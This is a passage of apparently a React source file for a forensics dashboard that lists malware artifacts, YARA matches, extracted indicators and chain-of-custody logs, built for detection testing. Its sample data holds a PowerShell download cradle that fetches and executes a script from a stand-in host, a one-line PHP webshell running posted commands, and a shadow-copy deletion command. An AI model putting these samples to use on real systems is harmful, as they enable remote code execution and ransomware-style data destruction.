import { useState, useEffect } from 'react'
import {
  FileSearch,
  Flame,
  CheckCircle2,
  Copy,
  Check,
  Search,
  FileCode,
  Link,
  Terminal,
  Activity,
  X,
  FolderLock
} from 'lucide-react'

export interface ChainOfCustodyLog {
  id: string
  artifact_id: string
  action: string
  performed_by: string
  details?: string | null
  sha256_at_action: string
  timestamp: string
}

export interface ForensicArtifact {
  id: string
  filename: string
  original_path?: string | null
  file_size_bytes: number
  mime_type: string
  magic_header?: string | null
  sha256: string
  md5: string
  sha1: string
  entropy: number
  verdict: 'malicious' | 'suspicious' | 'benign' | 'unknown'
  severity: string
  extracted_strings_sample: {
    extracted_sample?: string[]
    ips?: string[]
    urls?: string[]
    suspicious_apis?: string[]
    suspicious_commands?: string[]
  }
  yara_matches: {
    rule: string
    tags: string[]
    threat_type: string
    severity: string
    description?: string | null
    strings_matched: { identifier: string; offset: number }[]
  }[]
  uploaded_by: string
  created_at: string
  custody_logs: ChainOfCustodyLog[]
}

const DEMO_ARTIFACTS: ForensicArtifact[] = [
  {
    id: 'art-1',
    filename: 'wannacrypt_dropper.exe',
    file_size_bytes: 351232,
    mime_type: 'application/x-dosexec',
    magic_header: 'Windows PE Executable / DLL',
    sha256: 'ed01ebfbc9eb5bbea545af4d01bf5f1071661840480439c6e5babe8e080e41aa',
    md5: '84c82835a5d21bbcf75a61706d8ab549',
    sha1: '5ff465acf83e7c824e43f91702931464f80f8b09',
    entropy: 7.82,
    verdict: 'malicious',
    severity: 'critical',
    extracted_strings_sample: {
      ips: ['198.51.100.88', '203.0.113.14'],
      urls: ['http://www.iuqerfsodp9ifjaposdfjhgosurijfaewrwergwea.com'],
      suspicious_apis: ['VirtualAllocEx', 'WriteProcessMemory', 'CreateRemoteThread', 'CryptEncrypt'],
      suspicious_commands: ['vssadmin delete shadows /all /quiet', 'cmd.exe /c']
    },
    yara_matches: [
      {
        rule: 'Ransomware_ShadowCopy_Deletion',
        tags: ['ransomware'],
        threat_type: 'ransomware',
        severity: 'critical',
        description: 'Volume shadow copy deletion command indicative of ransomware',
        strings_matched: [{ identifier: '$s1', offset: 12480 }]
      },
      {
        rule: 'Process_Hollowing_Injection_APIs',
        tags: ['injection'],
        threat_type: 'injection',
        severity: 'high',
        description: 'Memory allocation and remote thread creation APIs used in code injection',
        strings_matched: [{ identifier: '$a1', offset: 45020 }, { identifier: '$a2', offset: 45084 }]
      }
    ],
    uploaded_by: 'lead.investigator@aegisflow.local',
    created_at: new Date(Date.now() - 1000 * 60 * 35).toISOString(),
    custody_logs: [
      {
        id: 'cust-1',
        artifact_id: 'art-1',
        action: 'collected',
        performed_by: 'lead.investigator@aegisflow.local',
        details: 'Acquired during Incident IR-2026-088 disk memory triage on Host DC-SRV-01.',
        sha256_at_action: 'ed01ebfbc9eb5bbea545af4d01bf5f1071661840480439c6e5babe8e080e41aa',
        timestamp: new Date(Date.now() - 1000 * 60 * 35).toISOString()
      },
      {
        id: 'cust-2',
        artifact_id: 'art-1',
        action: 'analyzed',
        performed_by: 'AegisFlow Static Forensic Engine',
        details: 'Automated static analysis & YARA matching executed. Verdict: MALICIOUS (2 rules matched).',
        sha256_at_action: 'ed01ebfbc9eb5bbea545af4d01bf5f1071661840480439c6e5babe8e080e41aa',
        timestamp: new Date(Date.now() - 1000 * 60 * 34).toISOString()
      },
      {
        id: 'cust-3',
        artifact_id: 'art-1',
        action: 'transferred',
        performed_by: 'soc.analyst@aegisflow.local',
        details: 'Transferred sealed evidence copy to Cyber Defense Vault Safe #3.',
        sha256_at_action: 'ed01ebfbc9eb5bbea545af4d01bf5f1071661840480439c6e5babe8e080e41aa',
        timestamp: new Date(Date.now() - 1000 * 60 * 10).toISOString()
      }
    ]
  },
  {
    id: 'art-2',
    filename: 'b64_c2_cradle.ps1',
    file_size_bytes: 4280,
    mime_type: 'text/x-shellscript',
    magic_header: 'POSIX Shell Script',
    sha256: 'a35b8cf01b91340fa087856d2cfd1e37bc902c1a84f3549ffb1d9d95f87b8951',
    md5: '7d5e4b6c9343cf49b38e0871e84a29a1',
    sha1: '9a8b7c6d5e4f3a2b1c0d9e8f7a6b5c4d3e2f1a0b',
    entropy: 5.64,
    verdict: 'suspicious',
    severity: 'high',
    extracted_strings_sample: {
      ips: ['203.0.113.88'],
      urls: ['http://203.0.113.88:8080/stage2.bin'],
      suspicious_apis: [],
      suspicious_commands: ['powershell', 'IEX', 'DownloadString', 'Net.WebClient']
    },
    yara_matches: [
      {
        rule: 'PowerShell_Encoded_Download_Cradle',
        tags: ['dropper'],
        threat_type: 'dropper',
        severity: 'high',
        description: 'Suspicious PowerShell hidden execution and download cradle',
        strings_matched: [{ identifier: '$ps1', offset: 0 }, { identifier: '$ps3', offset: 120 }]
      }
    ],
    uploaded_by: 'soc.analyst@aegisflow.local',
    created_at: new Date(Date.now() - 1000 * 60 * 95).toISOString(),
    custody_logs: [
      {
        id: 'cust-4',
        artifact_id: 'art-2',
        action: 'collected',
        performed_by: 'soc.analyst@aegisflow.local',
        details: 'Extracted from user temp startup folder on workstation WKSTN-FIN-04.',
        sha256_at_action: 'a35b8cf01b91340fa087856d2cfd1e37bc902c1a84f3549ffb1d9d95f87b8951',
        timestamp: new Date(Date.now() - 1000 * 60 * 95).toISOString()
      },
      {
        id: 'cust-5',
        artifact_id: 'art-2',
        action: 'analyzed',
        performed_by: 'AegisFlow Static Forensic Engine',
        details: 'Analysis completed. Verdict: SUSPICIOUS (1 rule matched).',
        sha256_at_action: 'a35b8cf01b91340fa087856d2cfd1e37bc902c1a84f3549ffb1d9d95f87b8951',
        timestamp: new Date(Date.now() - 1000 * 60 * 94).toISOString()
      }
    ]
  },
  {
    id: 'art-3',
    filename: 'corporate_policy.pdf',
    file_size_bytes: 84210,
    mime_type: 'application/pdf',
    magic_header: 'Adobe PDF Document',
    sha256: '9f86d081884c7d659a2feaa0c55ad015a3bf4f1b2b0b822cd15d6c15b0f00a08',
    md5: '5d41402abc4b2a76b9719d911017c592',
    sha1: '2aae6c35c94fcfb415dbe95f408b9ce91ee846ed',
    entropy: 4.12,
    verdict: 'benign',
    severity: 'info',
    extracted_strings_sample: {
      ips: [],
      urls: ['https://corporate.local/security-guidelines'],
      suspicious_apis: [],
      suspicious_commands: []
    },
    yara_matches: [],
    uploaded_by: 'auditor@aegisflow.local',
    created_at: new Date(Date.now() - 1000 * 60 * 240).toISOString(),
    custody_logs: [
      {
        id: 'cust-6',
        artifact_id: 'art-3',
        action: 'collected',
        performed_by: 'auditor@aegisflow.local',
        details: 'Routine compliance audit document verification sample.',
        sha256_at_action: '9f86d081884c7d659a2feaa0c55ad015a3bf4f1b2b0b822cd15d6c15b0f00a08',
        timestamp: new Date(Date.now() - 1000 * 60 * 240).toISOString()
      }
    ]
  }
]

export function DigitalForensics() {
  const [artifacts, setArtifacts] = useState<ForensicArtifact[]>(DEMO_ARTIFACTS)
  const [selectedArtifact, setSelectedArtifact] = useState<ForensicArtifact>(DEMO_ARTIFACTS[0])
  const [search, setSearch] = useState('')
  const [verdictFilter, setVerdictFilter] = useState('ALL')
  const [copiedHash, setCopiedHash] = useState<string | null>(null)
  const [inspectTab, setInspectTab] = useState<'overview' | 'yara' | 'strings' | 'custody'>('overview')
  const [custodyNote, setCustodyNote] = useState('')
  const [analyzing, setAnalyzing] = useState(false)
  const [uploadNotice, setUploadNotice] = useState<string | null>(null)

  const fetchLiveArtifacts = async () => {
    try {
      const res = await fetch('http://localhost:8000/api/v1/forensics/artifacts?limit=25')
      if (res.ok) {
        const data = await res.json()
        if (data.items && data.items.length > 0) {
          setArtifacts(data.items)
          setSelectedArtifact(data.items[0])
        }
      }
    } catch {
      // Fallback cleanly to demo state
    }
  }

  useEffect(() => {
    fetchLiveArtifacts()
  }, [])

  const copyToClipboard = (text: string, hashType: string) => {
    navigator.clipboard.writeText(text)
    setCopiedHash(hashType)
    setTimeout(() => setCopiedHash(null), 2000)
  }

  const handleSimulateSnippet = async (scenario: 'eicar' | 'ps_cradle' | 'php_webshell') => {
    setAnalyzing(true)
    setUploadNotice(null)

    let filename = ''
    let content = ''
    let label = ''

    if (scenario === 'eicar') {
      label = 'EICAR Standard Antivirus Test Signature'
      filename = 'eicar_test.com'
      content = 'X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*'
    } else if (scenario === 'ps_cradle') {
      label = 'PowerShell Obfuscated Download Cradle'
      filename = 'dropper_script.ps1'
      content =
        'powershell.exe -enc aW52b2tlLWV4cHJlc3Npb24= IEX(New-Object Net.WebClient).DownloadString("http://198.51.100.88/stage2.ps1")'
    } else {
      label = 'PHP Generic WebShell Backdoor'
      filename = 'c99_webshell.php'
      content =
        '<?php if(isset($_POST["cmd"])){ eval(base64_decode($_POST["cmd"])); passthru($_POST["cmd"]); } ?>'
    }

    try {
      const res = await fetch('http://localhost:8000/api/v1/forensics/artifacts/analyze-text', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ filename, content })
      })

      if (res.ok) {
        const newArt = await res.json()
        setArtifacts((prev) => [newArt, ...prev])
        setSelectedArtifact(newArt)
        setUploadNotice(`Forensic analysis completed for: ${label}`)
        setAnalyzing(false)
        return
      }
    } catch {
      // Fallback local simulation
    }

    // Local fallback
    const mockHash = 'b7d02b36dd8d40199a8f2937487b748b' + Math.random().toString(16).substring(2, 34)
    const newArt: ForensicArtifact = {
      id: `art-${Date.now()}`,
      filename,
      file_size_bytes: content.length,
      mime_type: scenario === 'php_webshell' ? 'application/x-php' : 'text/plain',
      magic_header: scenario === 'php_webshell' ? 'PHP Script' : 'ASCII / UTF-8 Plaintext',
      sha256: mockHash.repeat(2).substring(0, 64),
      md5: mockHash.substring(0, 32),
      sha1: mockHash.repeat(2).substring(0, 40),
      entropy: scenario === 'eicar' ? 5.82 : 4.88,
      verdict: 'malicious',
      severity: 'critical',
      extracted_strings_sample: {
        ips: scenario === 'ps_cradle' ? ['198.51.100.88'] : [],
        urls: scenario === 'ps_cradle' ? ['http://198.51.100.88/stage2.ps1'] : [],
        suspicious_apis: [],
        suspicious_commands: scenario === 'ps_cradle' ? ['powershell', 'DownloadString', 'IEX'] : ['eval', 'passthru']
      },
      yara_matches: [
        {
          rule:
            scenario === 'eicar'
              ? 'EICAR_Standard_Test_File'
              : scenario === 'ps_cradle'
              ? 'PowerShell_Encoded_Download_Cradle'
              : 'WebShell_PHP_Generic_Backdoor',
          tags: [scenario === 'eicar' ? 'test_malware' : scenario === 'ps_cradle' ? 'dropper' : 'webshell'],
          threat_type: scenario === 'eicar' ? 'test_malware' : scenario === 'ps_cradle' ? 'dropper' : 'webshell',
          severity: 'critical',
          description: `Signature match for ${label}`,
          strings_matched: [{ identifier: '$s1', offset: 0 }]
        }
      ],
      uploaded_by: 'soc.analyst@aegisflow.local',
      created_at: new Date().toISOString(),
      custody_logs: [
        {
          id: `cust-${Date.now()}`,
          artifact_id: `art-${Date.now()}`,
          action: 'collected',
          performed_by: 'soc.analyst@aegisflow.local',
          details: `Ingested ${label} snippet for static analysis.`,
          sha256_at_action: mockHash.repeat(2).substring(0, 64),
          timestamp: new Date().toISOString()
        },
        {
          id: `cust-${Date.now() + 1}`,
          artifact_id: `art-${Date.now()}`,
          action: 'analyzed',
          performed_by: 'AegisFlow Static Forensic Engine',
          details: 'YARA rule matching completed. Verdict: MALICIOUS.',
          sha256_at_action: mockHash.repeat(2).substring(0, 64),
          timestamp: new Date().toISOString()
        }
      ]
    }

    setArtifacts((prev) => [newArt, ...prev])
    setSelectedArtifact(newArt)
    setUploadNotice(`Forensic analysis completed for: ${label}`)
    setAnalyzing(false)
  }

  const handleAddCustodyAction = async () => {
    if (!custodyNote.trim()) return

    const newLog: ChainOfCustodyLog = {
      id: `cust-${Date.now()}`,
      artifact_id: selectedArtifact.id,
      action: 'transferred',
      performed_by: 'soc.analyst@aegisflow.local',
      details: custodyNote,
      sha256_at_action: selectedArtifact.sha256,
      timestamp: new Date().toISOString()
    }

    try {
      await fetch(`http://localhost:8000/api/v1/forensics/artifacts/${selectedArtifact.id}/custody`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ action: 'transferred', details: custodyNote })
      })
    } catch {
      // Fallback local update
    }

    const updated = {
      ...selectedArtifact,
      custody_logs: [...selectedArtifact.custody_logs, newLog]
    }
    setSelectedArtifact(updated)
    setArtifacts((prev) => prev.map((a) => (a.id === selectedArtifact.id ? updated : a)))
    setCustodyNote('')
  }

  const filteredArtifacts = artifacts.filter((a) => {
    const matchesSearch =
      search === '' ||
      a.filename.toLowerCase().includes(search.toLowerCase()) ||
      a.sha256.toLowerCase().includes(search.toLowerCase()) ||
      a.md5.toLowerCase().includes(search.toLowerCase())
    const matchesVerdict = verdictFilter === 'ALL' || a.verdict.toUpperCase() === verdictFilter
    return matchesSearch && matchesVerdict
  })

  const getVerdictBadge = (verdict: string) => {
    switch (verdict.toLowerCase()) {
      case 'malicious':
        return 'text-red-400 bg-red-950/60 border-red-500/40'
      case 'suspicious':
        return 'text-orange-400 bg-orange-950/60 border-orange-500/40'
      case 'benign':
        return 'text-emerald-400 bg-emerald-950/60 border-emerald-500/40'
      default:
        return 'text-slate-400 bg-slate-900 border-slate-700'
    }
  }

  const formatBytes = (bytes: number) => {
    if (bytes === 0) return '0 B'
    const k = 1024
    const sizes = ['B', 'KB', 'MB', 'GB']
    const i = Math.floor(Math.log(bytes) / Math.log(k))
    return parseFloat((bytes / Math.pow(k, i)).toFixed(2)) + ' ' + sizes[i]
  }

  return (
    <div className="space-y-6">
      {/* Upload Notification */}
      {uploadNotice && (
        <div className="p-4 rounded-xl border border-cyan-500/40 bg-cyan-950/40 text-cyan-300 flex items-center justify-between shadow-lg shadow-cyan-950/50">
          <div className="flex items-center gap-3">
            <CheckCircle2 className="w-5 h-5 text-cyan-400 animate-pulse" />
            <div>
              <p className="text-sm font-semibold">Artifact Ingested &amp; Statically Analyzed!</p>
              <p className="text-xs text-cyan-300/80 font-mono">{uploadNotice}</p>
            </div>
          </div>
          <button onClick={() => setUploadNotice(null)} className="text-cyan-400 hover:text-white cursor-pointer">
            <X className="w-4 h-4" />
          </button>
        </div>
      )}

      {/* Metrics Ribbon */}
      <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-4">
        <div className="p-4 rounded-xl bg-slate-900/60 border border-slate-800 backdrop-blur-sm relative overflow-hidden">
          <div className="absolute top-0 right-0 w-24 h-24 bg-cyan-500/5 rounded-bl-full pointer-events-none" />
          <div className="flex items-center justify-between">
            <span className="text-xs font-mono text-slate-400 uppercase tracking-wider">Total Evidence Items</span>
            <FolderLock className="w-4 h-4 text-cyan-400" />
          </div>
          <div className="mt-2 flex items-baseline gap-2">
            <span className="text-2xl font-bold font-mono text-cyan-400">{artifacts.length}</span>
            <span className="text-xs text-slate-500 font-mono">Secured Vault Artifacts</span>
          </div>
        </div>

        <div className="p-4 rounded-xl bg-slate-900/60 border border-slate-800 backdrop-blur-sm relative overflow-hidden">
          <div className="absolute top-0 right-0 w-24 h-24 bg-red-500/5 rounded-bl-full pointer-events-none" />
          <div className="flex items-center justify-between">
            <span className="text-xs font-mono text-slate-400 uppercase tracking-wider">Malware Detected</span>
            <Flame className="w-4 h-4 text-red-400" />
          </div>
          <div className="mt-2 flex items-baseline gap-2">
            <span className="text-2xl font-bold font-mono text-red-400">
              {artifacts.filter((a) => a.verdict === 'malicious').length}
            </span>
            <span className="text-xs text-slate-500 font-mono">YARA / Static Confirmed</span>
          </div>
        </div>

        <div className="p-4 rounded-xl bg-slate-900/60 border border-slate-800 backdrop-blur-sm relative overflow-hidden">
          <div className="absolute top-0 right-0 w-24 h-24 bg-orange-500/5 rounded-bl-full pointer-events-none" />
          <div className="flex items-center justify-between">
            <span className="text-xs font-mono text-slate-400 uppercase tracking-wider">Average Entropy</span>
            <Activity className="w-4 h-4 text-orange-400" />
          </div>
          <div className="mt-2 flex items-baseline gap-2">
            <span className="text-2xl font-bold font-mono text-orange-400">
              {(artifacts.reduce((acc, a) => acc + a.entropy, 0) / (artifacts.length || 1)).toFixed(2)}
            </span>
            <span className="text-xs text-slate-500 font-mono">/ 8.00 Shannon Scale</span>
          </div>
        </div>

        <div className="p-4 rounded-xl bg-slate-900/60 border border-slate-800 backdrop-blur-sm relative overflow-hidden">
          <div className="absolute top-0 right-0 w-24 h-24 bg-purple-500/5 rounded-bl-full pointer-events-none" />
          <div className="flex items-center justify-between">
            <span className="text-xs font-mono text-slate-400 uppercase tracking-wider">YARA Threat Rules</span>
            <FileCode className="w-4 h-4 text-purple-400" />
          </div>
          <div className="mt-2 flex items-baseline gap-2">
            <span className="text-2xl font-bold font-mono text-purple-400">5 Active</span>
            <span className="text-xs text-slate-500 font-mono">Ransomware, Droppers, C2</span>
          </div>
        </div>
      </div>

      {/* Forensic Test Simulation Toolbar */}
      <div className="p-4 rounded-xl bg-gradient-to-r from-cyan-950/40 via-slate-900/80 to-blue-950/40 border border-cyan-800/40 shadow-md">
        <div className="flex flex-col lg:flex-row items-start lg:items-center justify-between gap-4">
          <div>
            <div className="flex items-center gap-2">
              <FileSearch className="w-4 h-4 text-cyan-400" />
              <span className="text-sm font-bold text-white tracking-wide">
                Static Forensic Analysis &amp; YARA Scan Harness
              </span>
            </div>
            <p className="text-xs text-slate-400 font-mono mt-0.5">
              Submit suspicious payloads, memory dumps, or scripts to test cryptographic hashing, entropy calculation, and YARA detection.
            </p>
          </div>

          <div className="flex flex-wrap items-center gap-2">
            <button
              disabled={analyzing}
              onClick={() => handleSimulateSnippet('eicar')}
              className="px-3 py-1.5 rounded-lg bg-red-950/60 border border-red-700/50 hover:bg-red-900/80 text-red-300 text-xs font-mono transition flex items-center gap-1.5 cursor-pointer disabled:opacity-50"
            >
              <Flame className="w-3.5 h-3.5 text-red-400" />
              Analyze EICAR String
            </button>

            <button
              disabled={analyzing}
              onClick={() => handleSimulateSnippet('ps_cradle')}
              className="px-3 py-1.5 rounded-lg bg-orange-950/60 border border-orange-700/50 hover:bg-orange-900/80 text-orange-300 text-xs font-mono transition flex items-center gap-1.5 cursor-pointer disabled:opacity-50"
            >
              <Terminal className="w-3.5 h-3.5 text-orange-400" />
              Analyze PowerShell Dropper
            </button>

            <button
              disabled={analyzing}
              onClick={() => handleSimulateSnippet('php_webshell')}
              className="px-3 py-1.5 rounded-lg bg-purple-950/60 border border-purple-700/50 hover:bg-purple-900/80 text-purple-300 text-xs font-mono transition flex items-center gap-1.5 cursor-pointer disabled:opacity-50"
            >
              <FileCode className="w-3.5 h-3.5 text-purple-400" />
              Analyze PHP WebShell
            </button>
          </div>
        </div>
      </div>

      {/* Main Forensic Workbench: Left Artifact Catalog, Right Detailed Analysis */}
      <div className="grid grid-cols-1 lg:grid-cols-3 gap-6">
        {/* Artifact Catalog Column */}
        <div className="space-y-4">
          <div className="flex items-center gap-2">
            <div className="relative flex-1">
              <Search className="w-3.5 h-3.5 absolute left-3 top-1/2 -translate-y-1/2 text-slate-500" />
              <input
                type="text"
                placeholder="Search by filename or hash..."
                value={search}
                onChange={(e) => setSearch(e.target.value)}
                className="w-full pl-8 pr-3 py-1.5 bg-slate-900 border border-slate-800 rounded-lg text-xs font-mono text-slate-200 placeholder-slate-500 focus:outline-none focus:border-cyan-500"
              />
            </div>
            <select
              value={verdictFilter}
              onChange={(e) => setVerdictFilter(e.target.value)}
              className="bg-slate-900 border border-slate-800 rounded-lg px-2 py-1.5 text-xs font-mono text-slate-300 focus:outline-none focus:border-cyan-500"
            >
              <option value="ALL">All</option>
              <option value="MALICIOUS">Malicious</option>
              <option value="SUSPICIOUS">Suspicious</option>
              <option value="BENIGN">Benign</option>
            </select>
          </div>

          <div className="space-y-2 max-h-[620px] overflow-y-auto pr-1">
            {filteredArtifacts.map((art) => (
              <div
                key={art.id}
                onClick={() => setSelectedArtifact(art)}
                className={`p-3.5 rounded-xl border transition-all cursor-pointer ${
                  selectedArtifact.id === art.id
                    ? 'bg-[#0f1d3d] border-cyan-500/80 shadow-lg shadow-cyan-950/50'
                    : 'bg-slate-900/60 border-slate-800 hover:border-slate-700'
                }`}
              >
                <div className="flex items-start justify-between gap-2 mb-1.5">
                  <span className="font-mono text-xs font-bold text-white truncate max-w-[180px]">
                    {art.filename}
                  </span>
                  <span
                    className={`px-2 py-0.5 rounded text-[10px] font-mono uppercase font-bold border ${getVerdictBadge(
                      art.verdict
                    )}`}
                  >
                    {art.verdict}
                  </span>
                </div>

                <div className="text-[11px] font-mono text-slate-400 space-y-1">
                  <div className="flex items-center justify-between text-slate-500">
                    <span>{formatBytes(art.file_size_bytes)}</span>
                    <span>Entropy: {art.entropy.toFixed(2)}</span>
                  </div>
                  <div className="truncate text-slate-400 text-[10px]">
                    SHA256: {art.sha256.substring(0, 16)}...
                  </div>
                </div>
              </div>
            ))}
          </div>
        </div>

        {/* Detailed Forensic Workbench (2 Columns) */}
        <div className="lg:col-span-2 space-y-4">
          {/* Header Panel */}
          <div className="p-6 rounded-xl border border-slate-800 bg-slate-900/60 backdrop-blur-sm space-y-4">
            <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-3">
              <div>
                <div className="flex items-center gap-2 mb-1">
                  <span
                    className={`px-2.5 py-0.5 rounded text-xs font-mono uppercase font-bold border ${getVerdictBadge(
                      selectedArtifact.verdict
                    )}`}
                  >
                    {selectedArtifact.verdict}
                  </span>
                  <span className="text-xs font-mono text-slate-400">{selectedArtifact.mime_type}</span>
                </div>
                <h2 className="text-lg font-bold text-white font-mono">{selectedArtifact.filename}</h2>
              </div>

              <div className="text-right">
                <span className="text-xs font-mono text-slate-500 block">File Size</span>
                <span className="text-sm font-mono font-bold text-slate-200">
                  {formatBytes(selectedArtifact.file_size_bytes)} ({selectedArtifact.file_size_bytes.toLocaleString()} bytes)
                </span>
              </div>
            </div>

            {/* Hashes Ribbon */}
            <div className="p-3.5 rounded-lg bg-slate-950/80 border border-slate-800 space-y-2 text-xs font-mono">
              <div className="flex items-center justify-between gap-2">
                <span className="text-slate-500 w-16">SHA-256:</span>
                <span className="text-cyan-400 truncate flex-1 font-semibold">{selectedArtifact.sha256}</span>
                <button
                  onClick={() => copyToClipboard(selectedArtifact.sha256, 'sha256')}
                  className="p-1 hover:text-white text-slate-400 cursor-pointer"
                  title="Copy SHA-256"
                >
                  {copiedHash === 'sha256' ? <Check className="w-3.5 h-3.5 text-emerald-400" /> : <Copy className="w-3.5 h-3.5" />}
                </button>
              </div>

              <div className="flex items-center justify-between gap-2">
                <span className="text-slate-500 w-16">MD5:</span>
                <span className="text-slate-300 truncate flex-1">{selectedArtifact.md5}</span>
                <button
                  onClick={() => copyToClipboard(selectedArtifact.md5, 'md5')}
                  className="p-1 hover:text-white text-slate-400 cursor-pointer"
                  title="Copy MD5"
                >
                  {copiedHash === 'md5' ? <Check className="w-3.5 h-3.5 text-emerald-400" /> : <Copy className="w-3.5 h-3.5" />}
                </button>
              </div>

              <div className="flex items-center justify-between gap-2">
                <span className="text-slate-500 w-16">Entropy:</span>
                <div className="flex-1 flex items-center gap-3">
                  <div className="flex-1 bg-slate-900 h-2 rounded-full overflow-hidden">
                    <div
                      style={{ width: `${(selectedArtifact.entropy / 8.0) * 100}%` }}
                      className={`h-full rounded-full ${
                        selectedArtifact.entropy > 7.0
                          ? 'bg-red-500'
                          : selectedArtifact.entropy > 5.5
                          ? 'bg-orange-500'
                          : 'bg-cyan-500'
                      }`}
                    />
                  </div>
                  <span className="text-slate-300 font-bold">{selectedArtifact.entropy.toFixed(2)} / 8.00</span>
                </div>
              </div>
            </div>

            {/* Inspection Sub-Tabs */}
            <div className="flex border-b border-slate-800 gap-4 text-xs font-mono pt-2">
              <button
                onClick={() => setInspectTab('overview')}
                className={`pb-2 border-b-2 transition cursor-pointer ${
                  inspectTab === 'overview'
                    ? 'border-cyan-500 text-cyan-400 font-bold'
                    : 'border-transparent text-slate-400 hover:text-slate-200'
                }`}
              >
                Format &amp; Static Metadata
              </button>
              <button
                onClick={() => setInspectTab('yara')}
                className={`pb-2 border-b-2 transition cursor-pointer flex items-center gap-1.5 ${
                  inspectTab === 'yara'
                    ? 'border-cyan-500 text-cyan-400 font-bold'
                    : 'border-transparent text-slate-400 hover:text-slate-200'
                }`}
              >
                YARA Matches ({selectedArtifact.yara_matches.length})
              </button>
              <button
                onClick={() => setInspectTab('strings')}
                className={`pb-2 border-b-2 transition cursor-pointer ${
                  inspectTab === 'strings'
                    ? 'border-cyan-500 text-cyan-400 font-bold'
                    : 'border-transparent text-slate-400 hover:text-slate-200'
                }`}
              >
                Extracted IOCs &amp; APIs
              </button>
              <button
                onClick={() => setInspectTab('custody')}
                className={`pb-2 border-b-2 transition cursor-pointer flex items-center gap-1.5 ${
                  inspectTab === 'custody'
                    ? 'border-cyan-500 text-cyan-400 font-bold'
                    : 'border-transparent text-slate-400 hover:text-slate-200'
                }`}
              >
                Chain of Custody ({selectedArtifact.custody_logs.length})
              </button>
            </div>

            {/* TAB 1: OVERVIEW */}
            {inspectTab === 'overview' && (
              <div className="grid grid-cols-2 gap-4 text-xs font-mono pt-2">
                <div className="p-3 rounded-lg bg-slate-950/60 border border-slate-800/80">
                  <span className="text-slate-500 block mb-1">Detected Magic Header</span>
                  <span className="text-white font-semibold">{selectedArtifact.magic_header || 'Unknown'}</span>
                </div>
                <div className="p-3 rounded-lg bg-slate-950/60 border border-slate-800/80">
                  <span className="text-slate-500 block mb-1">Ingested By</span>
                  <span className="text-slate-300 font-semibold">{selectedArtifact.uploaded_by}</span>
                </div>
                <div className="p-3 rounded-lg bg-slate-950/60 border border-slate-800/80">
                  <span className="text-slate-500 block mb-1">SHA-1 Signature</span>
                  <span className="text-slate-300 truncate block">{selectedArtifact.sha1}</span>
                </div>
                <div className="p-3 rounded-lg bg-slate-950/60 border border-slate-800/80">
                  <span className="text-slate-500 block mb-1">Ingestion Timestamp</span>
                  <span className="text-slate-300">{new Date(selectedArtifact.created_at).toLocaleString()}</span>
                </div>
              </div>
            )}

            {/* TAB 2: YARA MATCHES */}
            {inspectTab === 'yara' && (
              <div className="space-y-3 pt-2">
                {selectedArtifact.yara_matches.length === 0 ? (
                  <p className="text-xs text-slate-500 font-mono py-6 text-center">
                    No active YARA rule matches detected for this artifact.
                  </p>
                ) : (
                  selectedArtifact.yara_matches.map((m) => (
                    <div key={m.rule} className="p-3.5 rounded-lg bg-slate-950/80 border border-red-900/40 space-y-2">
                      <div className="flex items-center justify-between">
                        <div className="flex items-center gap-2">
                          <Flame className="w-4 h-4 text-red-400" />
                          <span className="font-mono text-xs font-bold text-white">{m.rule}</span>
                        </div>
                        <span className="px-2 py-0.5 rounded text-[10px] font-mono uppercase font-bold bg-red-950 text-red-300 border border-red-700/60">
                          {m.severity}
                        </span>
                      </div>
                      <p className="text-xs text-slate-400 font-sans">{m.description}</p>
                      <div className="flex items-center gap-2 text-[11px] font-mono text-slate-500">
                        <span>Threat Category: <strong className="text-purple-300">{m.threat_type}</strong></span>
                        {m.tags && m.tags.length > 0 && <span>Tags: [{m.tags.join(', ')}]</span>}
                      </div>
                    </div>
                  ))
                )}
              </div>
            )}

            {/* TAB 3: EXTRACTED STRINGS & IOCS */}
            {inspectTab === 'strings' && (
              <div className="space-y-4 pt-2 text-xs font-mono">
                <div>
                  <span className="text-slate-400 font-bold block mb-1.5 flex items-center gap-1.5">
                    <Link className="w-3.5 h-3.5 text-cyan-400" />
                    Detected C2 IP Addresses &amp; URLs
                  </span>
                  <div className="p-3 rounded-lg bg-black/60 border border-slate-800 space-y-1">
                    {selectedArtifact.extracted_strings_sample?.ips?.map((ip) => (
                      <div key={ip} className="text-red-400 font-semibold">{ip} (IPv4 C2 Candidate)</div>
                    ))}
                    {selectedArtifact.extracted_strings_sample?.urls?.map((url) => (
                      <div key={url} className="text-orange-300 truncate">{url}</div>
                    ))}
                    {(!selectedArtifact.extracted_strings_sample?.ips?.length &&
                      !selectedArtifact.extracted_strings_sample?.urls?.length) && (
                      <span className="text-slate-500">No external network indicators extracted.</span>
                    )}
                  </div>
                </div>

                <div>
                  <span className="text-slate-400 font-bold block mb-1.5 flex items-center gap-1.5">
                    <Terminal className="w-3.5 h-3.5 text-purple-400" />
                    Suspicious Win32 APIs &amp; Command Invocations
                  </span>
                  <div className="p-3 rounded-lg bg-black/60 border border-slate-800 flex flex-wrap gap-1.5">
                    {selectedArtifact.extracted_strings_sample?.suspicious_apis?.map((api) => (
                      <span key={api} className="px-2 py-0.5 rounded bg-purple-950/70 border border-purple-800/60 text-purple-300">
                        {api}
                      </span>
                    ))}
                    {selectedArtifact.extracted_strings_sample?.suspicious_commands?.map((cmd) => (
                      <span key={cmd} className="px-2 py-0.5 rounded bg-amber-950/70 border border-amber-800/60 text-amber-300">
                        {cmd}
                      </span>
                    ))}
                    {(!selectedArtifact.extracted_strings_sample?.suspicious_apis?.length &&
                      !selectedArtifact.extracted_strings_sample?.suspicious_commands?.length) && (
                      <span className="text-slate-500">No suspicious API imports or commands identified.</span>
                    )}
                  </div>
                </div>
              </div>
            )}

            {/* TAB 4: CHAIN OF CUSTODY TIMELINE */}
            {inspectTab === 'custody' && (
              <div className="space-y-4 pt-2">
                <div className="space-y-3">
                  {selectedArtifact.custody_logs.map((log, index) => (
                    <div key={log.id} className="relative pl-6 pb-3 border-l-2 border-slate-800 last:border-transparent last:pb-0">
                      <div className="absolute -left-[7px] top-0.5 w-3 h-3 rounded-full bg-cyan-500 border-2 border-slate-900" />
                      <div className="p-3 rounded-lg bg-slate-950/70 border border-slate-800/80 space-y-1 text-xs font-mono">
                        <div className="flex items-center justify-between text-slate-400 text-[11px]">
